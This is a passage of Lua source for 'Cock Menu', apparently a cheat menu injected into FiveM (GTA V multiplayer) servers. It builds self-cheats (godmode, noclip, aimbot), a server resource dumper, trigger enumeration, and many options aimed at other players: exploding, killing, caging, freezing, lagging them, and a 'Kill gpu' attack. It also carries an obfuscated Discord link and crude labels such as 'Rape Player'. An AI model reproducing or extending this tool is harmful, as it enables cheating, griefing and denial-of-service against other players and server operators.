                           CockT.Inv["Wait"](100)
                           for k, v in CockT.Math.pairs(CockT.DynamicTriggers) do
                               Functions.f.GetAllTriggers(v)
                               CockT.Inv["Wait"](15)
                           end
                           Fatasf.n.Leprint("^1[^2CockMenu Logs^1] ^7Loaded!")
                       end
                   )
               end,
           }
       }
       
       local CockKeybinds = {
           Menu = {
               OpenMenuKey = {["Label"] = nil, ["Value"] = nil},
               Noclip = {["Label"] = 'NONE', ["Value"] = 12345},
               Heal = {["Label"] = 'NONE', ["Value"] = 12345},
               Revive = {["Label"] = 'NONE', ["Value"] = 12345},
               Armour = {["Label"] = 'NONE', ["Value"] = 12345},
               Freecam = {["Label"] = 'NONE', ["Value"] = 12345},
               Godmode = {["Label"] = 'NONE', ["Value"] = 12345},
               fixveh  = {["Label"] = 'NONE', ["Value"] = 12345},
               givevintage = {["Label"] = 'NONE', ["Value"] = 12345},
               givepistol = {["Label"] = 'NONE', ["Value"] = 12345},
               invisible = {["Label"] = 'NONE', ["Value"] = 12345},
               unlockveh = {["Label"] = 'NONE', ["Value"] = 12345},
           },
       }
       
       
       CockMeni.Functions.UpdateAllTriggers()
       CockMeni.Functions.LoadGif1()
       CockMeni.Functions.LoadGifLSC()
       
       
       Cock.Menu.SetMenuTitleBackgroundSprite = CockMeni.Functions.SetTitleBackgroundSprite
       Cock.Menu.SetMenuTitleBackgroundColor = CockMeni.Functions.SetTitleBackgroundColor
       CockMeni.Functions.SetMenuTitleColor = CockMeni.Functions.SetTitleColor
       Cock.Menu.SetMenuSubTitle = CockMeni.Functions.SetSubTitle
       Cock.Menu.SetMenuTitle = CockMeni.Functions.SetTitle
       
       Cock.Menu.SpawnInCar = true
       CockMenu.Freecam = false
       
       
       CockMeni.Functions.CurrentParticle = 1
       CockMeni.Functions.ParticleModes = {
           "Blood",
           "Fireworks", "Cartoon",
           "Explode", "Smoke",
       }
       
       ---
       
       menus = { }
       keys = { down = 187, up = 188, v2 = 189, v3 = 190, select = 191, back = 194 }
       optionCount = 0
       LastPressedKey = 0
       
       currentKey = nil
       currentMenu = nil
       toolTipWidth = 0.153
       
       spriteWidth = 0.027
       spriteHeight = spriteWidth * GetAspectRatio()
       
       titleHeight = 0.08--0.101
       titleYOffset = 0.021
       titleFont = 1
       titleScale = 1.0
       
       buttonHeight = 0.033
       buttonFont = 4
       buttonScale = 0.351 
       buttonTextXOffset = 0.005
       buttonTextYOffset = 0.005
       buttonSpriteXOffset = 0.002
       buttonSpriteYOffset = 0.005
       
       red2 = 131
       green2 = 219
       blue2 = 248
       rgb2 = {r=red2, g=green2, b=blue2}
       focusColourT = { rgb2.r, rgb2.g, rgb2.b, 255}
       
       defaultStyle = {
           x = 0.0175,
           y = 0.025,
           width = 0.2,
           maxOptionCountOnScreen = 10,
           titleColor = { 0, 0, 0, 255 },
           titleBackgroundColor = {0, 213, 255, 255, 255 },
           titleBackgroundSprite = nil,
           subTitleColor = { 0, 213, 255, 255, 255 },
           textColor = { 255, 255, 255, 255 },
           subTextColor = { 189, 189, 189, 255 },
           focusTextColor = { 0, 0, 0, 255 },
           backgroundColor = { 0, 0, 0, 190 },
           backgroundColourT = focusColourT,
           subTitleBackgroundColor = { 0, 0, 0, 255 },
           buttonPressedSound = { name = 'SELECT', set = 'HUD_FRONTEND_DEFAULT_SOUNDSET' }, --https://pastebin.com/0neZdsZ5
       }
       local red = 131
       local green = 219
       local blue = 248
       local rgb = {r=red, g=green, b=blue}
       defaultStyle.focusColor = { rgb.r, rgb.g, rgb.b, 170}
       
       Cock.Menu.Begin = tf.IsMenuOpened
       Cock.Menu.End = CockMeni.Functions.Display
       
       
       CockT.Inv["Thread"](function()
           while CockMenu.MenuEnabled do
               CockT.Inv["Wait"](0)
               local value, label = Functions.f.BindOnStart()
               CockKeybinds.Menu.OpenMenuKey["Label"] = label
               CockKeybinds.Menu.OpenMenuKey["Value"] = value
               break
           end
       end)
       
       CockT.Inv["Thread"](function()
           local CreateMenus = {"OnlineMenuButtons", "PlaySounds", "lscustoms", "performance", "exterior", "resfiles", "WeaponsAimbot", "WeaponsCustoms", "START", "self", "online", "vehicle", "weapons", "visuals", "destroyer", "Glife", "lua", "dumper", "keybinds", "addons", "settings", "music"}
           tf.CreateMenu("START", "", "Cock Menu ~b~\100\105\115\99\111\114\100\46\103\103\47\115\80\72\87\55\67\84\84\90\106")
           tf.CreateSubMenu("self", "START", "Self Options")
           tf.CreateSubMenu("online", "START", "Online Players")
           tf.CreateSubMenu("OnlineMenuButtons", "online", "Online Menu")
           tf.CreateSubMenu("PlaySounds", "OnlineMenuButtons", "Sounds")
           
           tf.CreateSubMenu("vehicle", "START", "Vehicle Menu")
           tf.CreateSubMenu("weapons", "START", "Weapons Menu")
           tf.CreateSubMenu("WeaponsAimbot", "weapons", "Aimbot")
           tf.CreateSubMenu("WeaponsCustoms", "weapons", "Weapons Customization")
           
           
           tf.CreateSubMenu("visuals", "START", "Visuals Menu")
           tf.CreateSubMenu("destroyer", "START", "Destroyer Menu")
           tf.CreateSubMenu("Glife", "START", "Glife")
           tf.CreateSubMenu("lua", "START", "Dynamic Triggers")
           tf.CreateSubMenu("dumper", "lua", "Resource Dumper")
           tf.CreateSubMenu("resfiles", "dumper", "")
           
           tf.CreateSubMenu("addons", "vehicle", "ADDONS")
           tf.CreateSubMenu("lscustoms", "vehicle", "lscustoms")
           tf.CreateSubMenu("performance", "lscustoms", "performance")
           
           tf.CreateSubMenu("exterior", "lscustoms", "exterior")
           tf.CreateSubMenu("music", "START", "music")
           
           tf.CreateSubMenu("settings", "START", "Settings")
           tf.CreateSubMenu("keybinds", "settings", "Keybinds Manager")
           
       
           for k, v in CockT.Math.pairs(CreateMenus) do
               CockMeni.Functions.SetTitleBackgroundSprite(v, "dickmenu", "vertissotraperdamnshit")
               CockMeni.Functions.SetTitleBackgroundSprite("lscustoms", "dequsamenu", "vertissotraperdamnshit")
               CockMeni.Functions.SetTitleBackgroundSprite("performance", "dequsamenu", "vertissotraperdamnshit")
               CockMeni.Functions.SetTitleBackgroundSprite("exterior", "dequsamenu", "vertissotraperdamnshit")
           end
       
       while CockMenu.MenuEnabled do
           CockT.Inv["Wait"](0)
                   local GlifeScripts = {'gtalife-z'}
                   CockMeni.Functions.Display()
                   if tf.IsMenuOpened("START") then	
                   if CockMeni.Functions.MenuButton("Self Options", "self", '    ') then end
                   if CockMeni.Functions.MenuButton("Online Players", "online", '    ') then end
                   if CockMeni.Functions.MenuButton("Vehicle", "vehicle", '    ') then end
                   if CockMeni.Functions.MenuButton("Weapons", "weapons", '    ') then end
                   if CockMeni.Functions.MenuButton("Visual", "visuals", '    ') then end
                   if CockMeni.Functions.MenuButton("Destroyer", "destroyer", '    ') then end
                   
                   for k, v in CockT.Math.pairs(GlifeScripts) do
                       if CockT.Global.CheckIfResourceExist(v) then
                           if CockMeni.Functions.MenuButton("Glife", "Glife", '    ') then 
                           end
                       end
                   end
   
                   if CockMeni.Functions.MenuButton("Lua", "lua", '    ') then end
                   if CockMeni.Functions.MenuButton("Music", "music", '') then  end
                   if CockMeni.Functions.MenuButton("Settings", "settings", '    ') then end
                   --if tf.UnclickableText("https://cock.menu/", '', 0.036) then end
               end
                   
                       if tf.IsMenuOpened("Glife") then
                           if CockMeni.Functions.CheckBox("Get loot (~r~Glife~s~)", Cock.Menu.getlootglife) then
                               Cock.Menu.getlootglife = not Cock.Menu.getlootglife
                           end
                           if CockMeni.Functions.CheckBox("Get loot #2 (~r~Glife~s~) [More safer]", Cock.Menu.getlootglife2) then
                               Cock.Menu.getlootglife2 = not Cock.Menu.getlootglife2
                           end
                           if CockMeni.Functions.CheckBox("Godmode (~r~Glife~s~)", Cock.Menu.godmodeglife) then
                               Cock.Menu.godmodeglife = not Cock.Menu.godmodeglife
                           end
                           
                           if tf.Button("Delete all zombies", "~r~Glife") then
                               Functions.f.DeleteZombies()
                           end
                           --if tf.Button("Zombie farm", "~r~Glife") then
                           --    Functions.f.SpawnZombies()
                           --end
                           if tf.Button("Teleport to spot #1", "~r~Glife") then
                               Fatasf.n.SetEntityCoordsNoOffset(Fatasf.n.PlayerPedId(), 143.13, -784.69, 31.93+1.0, true, true, true)
                           end
                           if tf.Button("Teleport to spot #2", "~r~Glife") then
                               Fatasf.n.SetEntityCoordsNoOffset(Fatasf.n.PlayerPedId(), -1264.07, -1535.97, 5.46+1.0, true, true, true)
                           end
                           if CockMeni.Functions.CheckBox("Unlimited ammo (~r~Glife~s~)", Cock.Menu.glifeunlammo) then
                               Cock.Menu.glifeunlammo = not Cock.Menu.glifeunlammo
                           end
                           if CockMeni.Functions.CheckBox("Player loot esp (~r~Glife~s~)", Cock.Menu.plootesp) then
                               Cock.Menu.plootesp = not Cock.Menu.plootesp
                           end
                       end
                       if tf.IsMenuOpened("self") then
                           if tf.Button("Revive", "~g~Native") then
                               CockMeni.Functions.natRe()
                           elseif tf.Button("Suicide", "~g~Native") then
                               Fatasf.n.SetEntityHealth(Fatasf.n.PlayerPedId(), 0)
                           elseif tf.CSeparator("~y~MOVEMENT", "") then
                           end
       
                           --[[if CockMeni.Functions.ComboBox("Walk Speed", CockMenu.ComboBoxesT.SpeedLabels, CockMenu.ComboBoxesT.MultIndex, CockMenu.ComboBoxesT.LengMult, function(currentIndex, selIndex)
                               CockMenu.ComboBoxesT.MultIndex = currentIndex
                               CockMenu.ComboBoxesT.LengMult = currentIndex
                           end) then]]
                               
                           if CockMeni.Functions.CheckBox("Infinite Stamina", Cock.Menu.maxstamina) then
                               Cock.Menu.maxstamina = not Cock.Menu.maxstamina
                           elseif CockMeni.Functions.CheckBox("Super jump", Cock.Menu.SJump) then
                               Cock.Menu.SJump = not Cock.Menu.SJump
                           elseif CockMeni.Functions.CheckBox("Extra jump", Cock.Menu.ExtraJump) then
                               Cock.Menu.ExtraJump = not Cock.Menu.ExtraJump
                           elseif CockMeni.Functions.CheckBox("Infinite combat roll", Cock.Menu.infroll) then
                               Cock.Menu.infroll = not Cock.Menu.infroll
                           elseif CockMeni.Functions.CheckBox("Super Run", Cock.Menu.superrun) then
                               Cock.Menu.superrun = not Cock.Menu.superrun
                           elseif CockMeni.Functions.CheckBox("Auto bunnyhop", Cock.Menu.taskjump) then
                               Cock.Menu.taskjump = not Cock.Menu.taskjump
                           elseif CockMeni.Functions.CheckBox("Noclip", Cock.Menu.NClip) then
                               Cock.Menu.NClip = not Cock.Menu.NClip
                           elseif CockMeni.Functions.ComboBox("Noclip speed", CockMenu.ComboBoxesT.NCSpeed, CockMenu.ComboBoxesT.NCSpeedMultIndex, CockMenu.ComboBoxesT.NCSpeedLengMult, function(currentIndex, selIndex)
                               CockMenu.ComboBoxesT.NCSpeedMultIndex = currentIndex 
                               CockMenu.ComboBoxesT.NCSpeedLengMult = currentIndex
                           end) then
                           elseif CockMeni.Functions.CheckBox("Anti AFK", Cock.Menu.AFK) then
                               Cock.Menu.AFK = not Cock.Menu.AFK
                           elseif tf.CSeparator("~y~OTHERS", "") then
                           end
                           
       
                           if CockMeni.Functions.ComboBox("Health:", CockMenu.ComboBoxesT.HpValue, CockMenu.ComboBoxesT.HpMultIndex, CockMenu.ComboBoxesT.HpLengMult, function(currentIndex, selIndex)
                               CockMenu.ComboBoxesT.HpMultIndex = currentIndex
                               CockMenu.ComboBoxesT.HpLengMult = currentIndex
                           end) then
                               Fatasf.n.SetEntityHealth(Fatasf.n.PlayerPedId(), CockMenu.ComboBoxesT.HpSet[CockMenu.ComboBoxesT.HpMultIndex])
                           end
       
                               if CockMeni.Functions.ComboBox("Armour:", CockMenu.ComboBoxesT.ArmourValue, CockMenu.ComboBoxesT.ArmMultIndex, CockMenu.ComboBoxesT.ArmLengMult, function(currentIndex, selIndex)
                                   CockMenu.ComboBoxesT.ArmMultIndex = currentIndex
                                   CockMenu.ComboBoxesT.ArmLengMult = currentIndex
                               end) then
                                   Fatasf.n.SetPedArmour(Fatasf.n.PlayerPedId(), CockMenu.ComboBoxesT.ArmSet[CockMenu.ComboBoxesT.ArmMultIndex])
                               end
                               if CockMeni.Functions.CheckBox("Godmode", Cock.Menu.Godmode) then
                                   Cock.Menu.Godmode = not Cock.Menu.Godmode
                               elseif CockMeni.Functions.CheckBox("Semi-Godmode", Cock.Menu.SemiGodmode) then
                                       Cock.Menu.SemiGodmode = not Cock.Menu.SemiGodmode
                               elseif tf.Button('Teleport To Waypoint') then
                                   CockMeni.Functions.TpToWaypoint()
                               end
                               if tf.CSeparator("~y~INVISIBLE", "") then
                               end
                               if CockMeni.Functions.CheckBox("Invisible", Cock.Menu.invisible) then
                                   Cock.Menu.invisible = not Cock.Menu.invisible
                               end
       
                               if CockMeni.Functions.ComboBox("Invisible alpha:", CockMenu.ComboBoxesT.InvsValue, CockMenu.ComboBoxesT.InvsMultIndex, CockMenu.ComboBoxesT.InvsLengMult, function(currentIndex, selIndex)
                                   CockMenu.ComboBoxesT.InvsMultIndex = currentIndex
                                   CockMenu.ComboBoxesT.InvsLengMult = currentIndex
                               end) then
                                   CockT.Inv["Invoke"](CockT.Natives['SetEntityAlpha'], Fatasf.n.PlayerPedId(), CockMenu.ComboBoxesT.InvsSet[CockMenu.ComboBoxesT.InvsMultIndex])
                               end
   
                               if CockMeni.Functions.CheckBox("Fast swim", Cock.Menu.fastswim) then
                                   Cock.Menu.fastswim = not Cock.Menu.fastswim
                               end
   
                               if CockMeni.Functions.CheckBox("Anti Drowing", Cock.Menu.antidrowing) then
                                   Cock.Menu.antidrowing = not Cock.Menu.antidrowing
                               end
                               if CockMeni.Functions.CheckBox("Anti Headshot", Cock.Menu.antihead) then
                                   Cock.Menu.antihead = not Cock.Menu.antihead
                               end
                               if CockMeni.Functions.CheckBox("Fake dead", Cock.Menu.fakedead) then
                                   Cock.Menu.fakedead = not Cock.Menu.fakedead
                               end
   
                               if CockMeni.Functions.ComboBox("Wanted level:", CockMenu.ComboBoxesT.WantedLVL, CockMenu.ComboBoxesT.WantedLVLMultIndex, CockMenu.ComboBoxesT.WantedLVLLengMult, function(currentIndex, selIndex)
                                   CockMenu.ComboBoxesT.WantedLVLMultIndex = currentIndex
                                   CockMenu.ComboBoxesT.WantedLVLLengMult = currentIndex
                               end) then
                                   CockT.Inv["Invoke"](CockT.Natives['SetPlayerWantedLevel'], Fatasf.n.PlayerId(), CockMenu.ComboBoxesT.WantedLVL[CockMenu.ComboBoxesT.WantedLVLMultIndex], false)
                                   CockT.Inv["Invoke"](CockT.Natives['SetPlayerWantedLevelNow'], Fatasf.n.PlayerId())
                               end
                               if CockMeni.Functions.CheckBox("Anti Stungun", Cock.Menu.antistungun) then
                                   Cock.Menu.antistungun = not Cock.Menu.antistungun
                               end
                               if CockMeni.Functions.CheckBox("No Ragdoll", Cock.Menu.noragdoll) then
                                   Cock.Menu.antistungun = not Cock.Menu.noragdoll
                               end
                               if tf.Button("Random Clothes", "~g~Native") then
                                   CockT.Global.RandomClothes()
                               end
                               if tf.Button("Get own ped", "~g~Native") then
                                   local m1 = Functions.f.CustomInput("Ped name", "a_c_hen", 25)
                                   CockT.Global.GetOwnPed(m1)
                               end
                               if CockMeni.Functions.CheckBox("Ghost rider (~r~Beta~s~)", Cock.Menu.ghostrider) then
                                   Cock.Menu.ghostrider = not Cock.Menu.ghostrider
                                   if Cock.Menu.ghostrider then
                                       local veh = Functions.f.SpawnVehicle('daemon')
                                       
                                       wwa = true
                                       Functions.f.FvckinDooogInvincibleglifeshit(true)
   
                                       
                                       CockT.Inv["Thread"](function()
                                           while wwa do
                                               CockT.Inv["Wait"](0)
                                               Functions.f.RepairVehicle()
                                               Fatasf.n.SetEntityOnlyDamagedByPlayer(veh, true) 
                                               Fatasf.n.SetEntityCanBeDamaged(veh, false)
                                               Fatasf.n.SetEntityInvincible(Fatasf.n.PlayerPedId(), true)
                                               Fatasf.n.SetEntityProofs(veh, false, true, true, false, false, false, false, false)
                                               Fatasf.n.SetEntityInvincible(veh, true)
                                               CockT.Inv["Invoke"](CockT.Natives['SetPlayerInvincible'], Fatasf.n.PlayerPedId(), true)
                                   
                                               local coords = Fatasf.n.GetEntityCoords(Fatasf.n.PlayerPedId())
                                               local dict = "core"
                                               Fatasf.n.RequestNamedPtfxAsset(dict)
                                               while not Fatasf.n.HasNamedPtfxAssetLoaded(dict) do
                                                   CockT.Inv["Wait"](0)
                                               end
                                               Fatasf.n.UseParticleFxAsset(dict)
                                               Fatasf.n.StartNetworkedParticleFxNonLoopedAtCoord("ent_sht_petrol_fire", coords.x, coords.y, coords.z, 0, 0, 0, 2.0, 0, 0, 0)
                                           end
                                       end)
                                   else
                                       Fatasf.n.SetEntityProofs(Fatasf.n.PlayerPedId(), false, false, false, false, false, false, false, false)
                                       Fatasf.n.SetEntityProofs(veh, false, false, false, false, false, false, false, false)
                                       Fatasf.n.SetEntityInvincible(veh, false)
                                       wwa = false
                                       Fatasf.n.DeleteEntity(veh)
                                   
                                       Fatasf.n.SetEntityInvincible(Fatasf.n.PlayerPedId(), false) 
                                       CockT.Inv["Invoke"](CockT.Natives['SetPlayerInvincible'], Fatasf.n.PlayerId(), false) 
                                       Fatasf.n.SetEntityOnlyDamagedByPlayer(Fatasf.n.PlayerPedId(), false) 
                                       Fatasf.n.SetEntityCanBeDamaged(Fatasf.n.PlayerPedId(), true)
                                       
                                       Fatasf.n.SetEntityOnlyDamagedByPlayer(veh, false) 
                                       Fatasf.n.SetEntityCanBeDamaged(veh, true)
                                       Functions.f.FvckinDooogInvincibleglifeshit(false)
                                   end
                               end
   
                           end
                           if tf.IsMenuOpened("PlaySounds") then
                              
                               if CockMeni.Functions.ComboBox("Play Sound", CockMenu.ComboBoxesT.Playsound2, CockMenu.ComboBoxesT.Playsound2MultIndex, CockMenu.ComboBoxesT.Playsound2LengMult, function(currentIndex, selIndex)
                                   CockMenu.ComboBoxesT.Playsound2MultIndex = currentIndex
                                   CockMenu.ComboBoxesT.Playsound2LengMult = currentIndex
                               end) then
                                   local sound1 = "CANCEL"
                                   local sound2 = CockMenu.ComboBoxesT.Playsound2[CockMenu.ComboBoxesT.Playsound2MultIndex]
                                   if sound2 == "HUD_MINI_GAME_SOUNDSET" then
                                       sound1 = "CANCEL"
                                   elseif sound2 == "HUD_FRONTEND_DEFAULT_SOUNDSET" then
                                       sound1 = "CANCEL"
                                   elseif sound2 == "MUGSHOT_CHARACTER_CREATION_SOUNDS" then  
                                       sound1 = "Take_Picture" 
                                   elseif sound2 == "LESTER1A_SOUNDS" then  
                                       sound1 = "Virus_Eradicated" 
                                   elseif sound2 == "SHORT_PLAYER_SWITCH_SOUND_SET" then  
                                       sound1 = "All" 
                                   elseif sound2 == "FM_Events_Sasquatch_Sounds" then  
                                       sound1 = "Frontend_Beast_Frozen_Screen_Loop"   
                                   elseif sound2 == "CAR_STEAL_2_SOUNDSET" then  
                                       sound1 = "Garage_Open"   
                                   end
                                   Fatasf.n.PlaySound(-1, sound1, sound2, true)
                               end
                           end
   
                           if tf.IsMenuOpened("OnlineMenuButtons") then 
                               if CockMeni.Functions.CheckBox("Spectate", Cock.Menu.Spectate) then
                                   Cock.Menu.Spectate = not Cock.Menu.Spectate
                               end
                               if CockMeni.Functions.CheckBox("Spectate [#2]", Cock.Menu.Spectate2) then
                                   Cock.Menu.Spectate2 = not Cock.Menu.Spectate2
                               end
                               
                               if CockMeni.Functions.CheckBox("Lag player", Cock.Menu.lagplayer) then
                                   Cock.Menu.lagplayer = not Cock.Menu.lagplayer
                               end
       
                               if tf.CSeparator("~y~BASIC", "") then
                               end
                               if tf.Button('Teleport To Player', "~y~Semi") then
                                   CockT.Global.TeleportToPlayer(CockT.Global.SelectedPlayer)
                               end
   
                               if tf.Button('Copy Outfit', "~y~Semi") then
                                   CockT.Global.CopyOutfit(CockT.Global.SelectedPlayer)
                               end
                               if tf.CSeparator("~y~TROLL", "") then
                               end
                               if tf.Button('Explode Player', "~y~Semi") then
                                   Fatasf.n.AddExplosion(Fatasf.n.GetEntityCoords(Fatasf.n.GetPlayerPed(CockT.Global.SelectedPlayer)), CockMenu.ComboBoxesT.explosiontype[CockMenu.ComboBoxesT.explosiontypeMultIndex], 100.0, Cock.Menu.Audible, Cock.Menu.IsInvs, 0.0)
                               end
                               if CockMeni.Functions.ComboBox("Explode type", CockMenu.ComboBoxesT.explosiontype, CockMenu.ComboBoxesT.explosiontypeMultIndex, CockMenu.ComboBoxesT.explosiontypeLengMult, function(currentIndex, selIndex)
                                   CockMenu.ComboBoxesT.explosiontypeMultIndex = currentIndex
                                   CockMenu.ComboBoxesT.explosiontypeLengMult = currentIndex
                               end) then
                               end
                               if CockMeni.Functions.CheckBox("Audible", Cock.Menu.Audible) then
                                   Cock.Menu.Audible = not Cock.Menu.Audible
                               end
                               if CockMeni.Functions.CheckBox("Invisible", Cock.Menu.IsInvs) then
                                   Cock.Menu.IsInvs = not Cock.Menu.IsInvs
                               end
                               if tf.Button('Molotov Player', "~y~Semi") then
                                   CockT.Global.MolotovPlayer(CockT.Global.SelectedPlayer)
                               end
                               if tf.Button('Cage Player', "~y~Semi") then
                                   CockT.Global.CageNew(CockT.Global.SelectedPlayer)
                               end
                               if tf.Button('Rape Player', "~y~Semi") then
                                   CockT.Global.RapeP(CockT.Global.SelectedPlayer)
                               end
                               if tf.Button('Clone Player', "~y~Semi") then
                                   Fatasf.n.ClonePed(Fatasf.n.GetPlayerPed(CockT.Global.SelectedPlayer), true, false, true)
                               end
                               if tf.Button('Shit rain', "~y~Semi") then
                                   CockMeni.Functions.ShitRain(CockT.Global.SelectedPlayer, 'pounder', 5)
                                   CockMeni.Functions.ShitRain(CockT.Global.SelectedPlayer, 'adder', 5)
                                   CockMeni.Functions.ShitRain(CockT.Global.SelectedPlayer, 'Submersible', 5)
                                   CockMeni.Functions.ShitRain(CockT.Global.SelectedPlayer, 'cutter', 5)
                                   CockMeni.Functions.ShitRain(CockT.Global.SelectedPlayer, 'faggio3', 5)
                               end
       
                               if tf.CSeparator("~y~OTHER", "") then
                               end
       
                               if tf.Button('Taze player', "~y~Semi") then
                                   CockT.Global.TazePlayer(CockT.Global.SelectedPlayer)
                               end
       
                               if tf.Button('Sirens on player', "~y~Semi") then
                                   CockMeni.Functions.SirensOnPlayer(CockT.Global.SelectedPlayer)
                               end
                               if tf.Button('Kill player', "~y~Semi") then
                                   CockMeni.Functions.KillPlayer(CockT.Global.SelectedPlayer)
                               end
                               --[[if tf.Button('Silent Kill', "~y~Semi") then
                                   CockMeni.Functions.SilentKill(CockT.Global.SelectedPlayer)
                               end]]
                               if tf.Button('Kick from vehicle', "~y~Semi") then
                                   CockT.Global.KickFromVehicle(CockT.Global.SelectedPlayer)
                               end
                               if tf.Button('Custom prop', "~y~Semi") then
                                   local object = Functions.f.CustomInput("Custom prop name", "prop_beach_fire", 25)
                                   CockT.Global.CustomProp(object, CockT.Global.SelectedPlayer)
                               end
                               if tf.Button('Give all weapons', "~r~Risky") then
                                   for weapo = 1, #CockT.Weapons do
                                       Fatasf.n.GiveDelayedWeaponToPed(Fatasf.n.GetPlayerPed(CockT.Global.SelectedPlayer), Fatasf.n.GetHashKey("WEAPON_" .. CockT.Weapons[weapo]), 150, false)
                                   end
                               end
                               if tf.Button('Remove all weapons', "~r~Risky") then
                                   for weapo = 1, #CockT.Weapons do
                                       CockT.Inv["Invoke"](CockT.Natives["RemoveAllPedWeapons"], Fatasf.n.GetPlayerPed(CockT.Global.SelectedPlayer), false)
                                   end
                               end
                               if tf.Button('Give weapon', "~y~Semi") then
                                   local weapon =  Functions.f.CustomInput("Weapon To Spawn", "weapon_pistol", 30)
                                   Fatasf.n.GiveDelayedWeaponToPed(Fatasf.n.GetPlayerPed(CockT.Global.SelectedPlayer), Fatasf.n.GetHashKey(weapon), 255, false)
                               end
                               if tf.Button('Burn player car', "~y~Semi") then
                                   Cock.Menu.burnplayercar = not Cock.Menu.burnplayercar
                               end
                               if tf.Button('Plant bomb on player car', "~y~Semi") then
                                   Cock.Menu.plantthebomb = not Cock.Menu.plantthebomb
                                   if Cock.Menu.plantthebomb then
                                       if Fatasf.n.IsPedSittingInVehicle(Fatasf.n.GetPlayerPed(CockT.Global.SelectedPlayer), Fatasf.n.GetVehiclePedIsIn(Fatasf.n.GetPlayerPed(CockT.Global.SelectedPlayer), false)) then
                                           --[[ local bomb = Fatasf.n.CreateAnDui("https://cock.menu/music/bombhasbeenplanted.mp3", 1, 1, 1)
                                           CockT.Inv["Wait"](1600)
                                           Fatasf.n.DestroyDui(bomb) ]]
                                           local coords = Fatasf.n.GetEntityCoords(Fatasf.n.GetPlayerPed(CockT.Global.SelectedPlayer))
                                           Fatasf.n.AddExplosion(coords.x, coords.y, coords.z, 5, 100.0, true, false, 0.0)
                                       end
                                   end
                               end
                               if tf.Button('Fuck vehicle', "~y~Semi") then
                                   Functions.f.FuckVehicle(CockT.Global.SelectedPlayer)
                               end
                               if tf.Button('Spawn bitch in player vehicle', "~y~Semi") then
                                   CockMeni.Functions.SpawnBitch(CockT.Global.SelectedPlayer)
                               end
                               if tf.Button('Aggressive bolivanos', "~y~Semi") then
                                   CockT.Global.SpawnKillingMexico(CockT.Global.SelectedPlayer)
                               end
                               if tf.Button("Unex devs on player", "~y~Semi") then
                                   CockT.Global.UnexOnPlayer(CockT.Global.SelectedPlayer, 10) 
                               end
                               if tf.Button("Kill gpu", "~y~Semi") then
                                   Functions.f.KIllGpu(CockT.Global.SelectedPlayer)
                               end
                               if tf.Button("Ram Player", "~y~Semi") then
                                   Functions.f.GetRamedByVehicle('rumpo', CockT.Global.SelectedPlayer)
                               end
                               if tf.Button("Bug player vehicle", "~y~Semi") then
                                   Functions.f.BugPlayerVeh(CockT.Global.SelectedPlayer)
                               end
                               if CockMeni.Functions.CheckBox("Fire on player", Cock.Menu.fireonplayer) then
                                   Cock.Menu.fireonplayer = not Cock.Menu.fireonplayer
                               end
                               if CockMeni.Functions.CheckBox("Clown on player", Cock.Menu.Clownonplayer) then
                                   Cock.Menu.Clownonplayer = not Cock.Menu.Clownonplayer
                               end
                               if tf.Button("Delete player vehicle", "~y~Semi") then
                                   Fatasf.n.DeleteEntity(Fatasf.n.GetVehiclePedIsIn(Fatasf.n.GetPlayerPed(CockT.Global.SelectedPlayer)))
                               end
                               if tf.Button("Man with middle fingers", "~r~Risk") then
                                   CockT.Global.MiddleFinger(CockT.Global.SelectedPlayer)
                               end
                               if tf.Button("Send isis", "~r~Risk") then
                                   CockT.Global.isisattack(Fatasf.n.GetEntityCoords(GetPlayerPed(CockT.Global.SelectedPlayer)))
                               end
                               if tf.Button("Warp vehicle", "~y~Semi") then
                                   CockT.Global.WarpVehicle(CockT.Global.SelectedPlayer)
                               end
                               if tf.Button("PP on head", "~r~Risk") then
                                   CockT.Global.PPonHead(CockT.Global.SelectedPlayer)
                               end
                               if tf.Button("Fuck Engine", "~r~Risk") then
                                   CockT.Global.FuckPlayerEngine(CockT.Global.SelectedPlayer)
                               end
                               
                               if Cock.AimFriends[Fatasf.n.GetPlayerName(CockT.Global.SelectedPlayer)] == true then
                                   if tf.Button("Remove Friend ("..Fatasf.n.GetPlayerName(CockT.Global.SelectedPlayer)..")", "~g~Safe") then
                                       Cock.AimFriends[Fatasf.n.GetPlayerName(CockT.Global.SelectedPlayer)] = false
                                   end
                               else
                                   if tf.Button("Add Friend ("..Fatasf.n.GetPlayerName(CockT.Global.SelectedPlayer)..")", "~g~Safe") then
                                       Cock.AimFriends[Fatasf.n.GetPlayerName(CockT.Global.SelectedPlayer)] = true
                                   end
                               end
                               if CockMeni.Functions.CheckBox("SpaceX", Cock.Menu.LaunchPlayer) then
                                   Cock.Menu.LaunchPlayer = not Cock.Menu.LaunchPlayer
                               end
                               if CockMeni.Functions.CheckBox("SpaceX2", Cock.Menu.SpaceX2) then
                                   Cock.Menu.SpaceX2 = not Cock.Menu.SpaceX2
                               end
                               
                               if tf.Button("Freeze player", "~y~Semi") then
                                   Functions.f.FreezePlayer(CockT.Global.SelectedPlayer)
                               end
                               if tf.Button("Spawn Hitman", "~y~Semi") then
                                   CockT.Global.Hitman(CockT.Global.SelectedPlayer)
                               end
                               if tf.Button("Give own army", "~y~Semi") then
                                   CockT.Global.GivePlayerArmy(CockT.Global.SelectedPlayer)
                               end
                               if tf.Button("Do gangbang", "~y~Semi") then
                                   CockT.Global.DoGangbangPlayer(CockT.Global.SelectedPlayer)
                               end
                               if tf.Button("Custom particle", "~y~Semi") then
                                   CockT.Global.PlayCustompParticle(CockT.Global.SelectedPlayer)
                               end
                               if CockMeni.Functions.CheckBox("Give player explosive ammo", Cock.Menu.giveexplosiveammo) then
                                   Cock.Menu.giveexplosiveammo = not Cock.Menu.giveexplosiveammo
                               end
                               if CockMeni.Functions.CheckBox("Give player molotov ammo", Cock.Menu.givemolotovammo) then
                                   Cock.Menu.givemolotovammo = not Cock.Menu.givemolotovammo
                               end
                               if CockMeni.Functions.CheckBox("Give player prop ammo", Cock.Menu.givepropammo) then
                                   Cock.Menu.givepropammo = not Cock.Menu.givepropammo
                               end
                               if CockMeni.Functions.CheckBox("Taze loop", Cock.Menu.tazeloop) then
                                   Cock.Menu.tazeloop = not Cock.Menu.tazeloop
                               end
                               if CockMeni.Functions.CheckBox("Kick from vehicle loop", Cock.Menu.kickfromveh) then
                                   Cock.Menu.kickfromveh = not Cock.Menu.kickfromveh
                               end
                               if CockMeni.Functions.CheckBox("Ear rape", Cock.Menu.earrape) then
                                   Cock.Menu.earrape = not Cock.Menu.earrape
                               end
                               if CockMeni.Functions.MenuButton("Play Sound", "PlaySounds", ">") then 
                                   
                               end
                              
                               
       
                               
                               if tf.CSeparator("~y~INFO", "") then
                               end
